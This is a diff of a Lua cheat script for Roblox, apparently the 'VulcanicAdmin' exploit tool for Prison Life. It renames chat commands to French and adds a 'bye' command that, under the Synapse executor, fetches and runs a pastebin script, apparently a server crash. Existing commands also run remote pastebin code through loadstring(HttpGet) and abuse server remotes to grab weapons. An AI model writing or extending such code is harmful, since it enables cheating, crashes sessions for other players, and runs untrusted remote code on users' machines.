@@ -388,10 +388,9 @@ Close_2.TextSize = 14.000
 Main.Name = "Main"
 Main.Parent = VulcanicAdmin
 Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Main.BorderSizePixel = 1
-Main.BorderColor3 = Color3.fromRGB(255, 128, 0)
+Main.BorderColor3 = Color3.fromRGB( 255, 128, 0)
 Main.Position = UDim2.new(0, 5, 1, -100)
-Main.Size = UDim2.new(0, 200, 0, 70)
+Main.Size = UDim2.new(0, 200, 0, 59)
 Main.Visible = true
 
 Bar.Name = "Bar"
@@ -2037,7 +2036,7 @@ function LocalPlayerChatted(msg)
 			notify("Turned esp teams",arg2..".")
 		end
 	end
-	if command("shield") then
+	if command("bouclier") then
 		local lastPos = GetRootOri()
 		local lastCam = workspace.CurrentCamera.CFrame
 		game:GetService("Workspace").Remote.loadchar:InvokeServer(nil,"Bright blue")
@@ -2047,7 +2046,7 @@ function LocalPlayerChatted(msg)
 		game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
 		notify("Gave shield.")
 	end
-	if command("armor") then
+	if command("armure") then
 		local lastPos = GetRootOri()
 		local lastCam = workspace.CurrentCamera.CFrame
 		game:GetService("Workspace").Remote.loadchar:InvokeServer(nil,"Bright blue")
@@ -2060,6 +2059,15 @@ function LocalPlayerChatted(msg)
 	if command("prx") then
 		loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
 	end
+	if command("bye") then
+	if not syn then 
+	    game.Players.LocalPlayer:Kick("Oblivion Support : your exploit doesn't support crash command")
+else
+    if syn then
+	loadstring(game:HttpGet('https://pastebin.com/FVvmNR0F'))()
+    end
+end
+end
 	if command('getusers') then
 		chatnotify('Vulcanic Users:')
 		for _,v in pairs(game.Players:GetPlayers()) do
@@ -2079,7 +2087,7 @@ function LocalPlayerChatted(msg)
 		game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
 		notify("Gave kit.")
 	end
-	if command("guns") or command("gun") then
+	if command("armes") or command("gun") then
 		if ownsSwat then
 			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
 			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
